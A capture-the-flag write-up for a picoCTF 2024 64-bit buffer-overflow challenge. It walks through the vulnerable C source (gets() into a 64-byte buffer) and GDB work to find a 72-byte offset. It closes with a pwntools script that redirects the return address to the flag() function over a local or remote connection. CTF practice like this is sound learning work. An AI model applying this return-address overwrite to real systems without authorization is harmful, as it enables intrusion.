```markup
Tags: Binary Exploitation, picoCTF2024, x64
Date: 2024-07-25
Difficulty: Easy
Duration: 1h
Author: Hunter0
```
## Description
Overflow x64 code
Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the `flag` function in this ==program==. Download ==source==. `nc saturn.picoctf.net 55429`

Hints: 
1. Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes.
2. Jump to the second instruction (the one after the first `push`) in the `flag` function, if you're getting mysterious segmentation faults.

---
## Writeup
Running the binary we can see, that user input is inserted to the program, the program then exits.
```bash
└─$ ./vuln                                                           
Welcome to 64-bit. Give me a string that gets you the flag: 
hello

```
Opening the vuln.c file, we can see that the main function is making a calling the vuln() function, here vuln() is taking user input through gets() with BUFFSIZE of 64. Besides that there is the interesting flag() function which opens flag.txt file.
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r"); // Flag file is opened here
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf); // vuln() uses gets with BUFSIZE 64
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln(); // main() is calling vuln()
  return 0;
}
```
gets() is a dangerous function that does not consider buffer size in stdin -> this is our overflow vector.
We can test by sending data that is larger than 64 bytes.
```bash
└─$ ./vuln                      
Welcome to 64-bit. Give me a string that gets you the flag: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./vuln
```
We witness a segmentation fault when we insert 70 bytes of 'A' char.
We can continue, by investigating our binary using GDB.
![](img/Pasted%20image%2020240726003508.png)
This is the assembly code of main(), here we see our call to vuln() is located at 0x401333 (32 bit) and the following instruction is located at 0x401338, this will be the return address when the stack frame for function call vuln() is created.
![](img/Pasted%20image%2020240726004137.png)
Here I set a breakpoint at when the vuln() function is called and second breakpoint after the gets() command in the vuln() function. Our purpose here is to first find the address of our buffer and the return address.
When running the debugger, we see that the first breakpoint is met, here information such as the location of the RSP register can be outline (0x7fffffffdd10), I also get the address of the flag() function as well (0x401236). 
![](img/Pasted%20image%2020240726005009.png)
Continuing the program, I input "AAAA" and the second breakpoint is reached, if we looked closely at the assembly code for function vuln(). We can see that `<vuln+12>` instruction `lea rax, rbp-0x40` this is allocating memory addresses for our variable, in this function the only variable is our buffer (so the address that RAX is storing must be the address to our input buffer). See image below.
![](img/Pasted%20image%2020240726005534.png)
Here we see that $rax contains the hex representation of "AAAA" which is 0x41414141, we also found here an interesting address 0x00401338 (which is the address to the next instruction in main) so this is the return address.
From here we can find our offset: 0x7fffffffdd08 - 0x7fffffffdcc0 = 0x48 (72) so the distance from the buffer to the return address is 72 bytes.
We can try to overflow, flood the register with 72 bytes 'A' and 4 bytes 'B'.
![](img/Pasted%20image%2020240726010907.png)
Here we can see that our stack has been overflowed and we have overflowed into the return_address, we can see that continuing the program register RIP is pointed to 0x42424242 ("BBBB"), now that we have located where the return address is we can attempt to point to 0x401236 which is where the flag() function is. Doing this will call the flag function which will give us the flag.
```python
import pwn
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("choice", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)

args = parser.parse_args()

elf = pwn.ELF("./vuln")

# Buffer overflow at 72 bytes
# The address of flag() function
new_rip = pwn.p64(elf.symbols["flag"])
return_main = pwn.p64(elf.symbols["main"])

print(new_rip)
print(pwn.p64(0x40123b))

#return_main = pwn.p64(elf.symbols["main"])

payload = b"".join(
        [
            b"A" * 72,
            pwn.p64(0x40123b),
            return_main,
        ]
    )

payload += b"\n"
if args.choice == "local":
    p = elf.process()

elif args.choice == "remote":
    if not args.target or not args.port:
        pwn.warning("Supply -t <target> -p <port>")
        exit()
    p = pwn.remote(args.target, args.port)

p.sendline(payload)
p.interactive()
```
The following exploit code is written, executing it will give us the flag.
![](img/Pasted%20image%2020240726011347.png)
